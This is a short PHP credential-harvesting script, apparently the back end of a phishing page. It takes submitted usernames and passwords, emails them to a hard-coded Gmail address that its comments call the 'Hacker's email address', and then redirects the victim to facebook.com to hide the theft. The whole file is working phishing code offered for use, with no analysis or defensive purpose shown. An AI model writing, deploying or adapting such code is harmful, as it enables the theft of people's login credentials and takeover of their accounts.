

<?php
if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare the data to be sent
    $data = "Username: $username, Password: $password\n";

    // Send stolen credentials to an email address
    $to = "benjaminlambrecht123@gmail.com";  // Hacker's email address
    $subject = "anonymous Kay";
    $headers = "From: no-reply@yourdomain.com\r\n";

    // Send the email
    mail($to, $subject, $data, $headers);

    // Optional: Redirect victim to the legitimate site or a fake success page
    header("Location: https://facebook.com");
}
?>